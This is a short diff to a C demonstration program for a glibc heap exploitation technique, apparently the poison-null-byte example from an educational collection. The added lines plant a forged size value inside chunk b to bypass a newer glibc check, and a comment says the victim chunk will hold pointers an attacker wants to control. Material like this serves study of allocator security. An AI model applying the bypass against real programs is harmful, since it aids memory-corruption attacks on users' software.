@@ -48,6 +48,14 @@ int main()
 
 	uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
 	printf("c.prev_size is %#lx\n",*c_prev_size_ptr);
+
+	// added fix for size==prev_size(next_chunk) check in newer versions of glibc
+	// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
+	// for this added check we need to have null bytes in b (not just a c string)
+	*(size_t*)(b+0x1f0) = 0x200;
+	printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
+	       "the check 'chunksize(P) != prev_size (next_chunk(P))'\n");
+
 	b1 = malloc(0x100);
 
 	printf("b1: %p\n",b1);
@@ -56,6 +64,7 @@ int main()
 	printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
 		"before c.prev_size: %lx\n",*(((uint64_t*)c)-4));
 	printf("We malloc 'b2', our 'victim' chunk.\n");
+	// Typically b2 (the victim) will be a structure with valuable pointers that we want to control
 
 	b2 = malloc(0x80);
 	printf("b2: %p\n",b2);
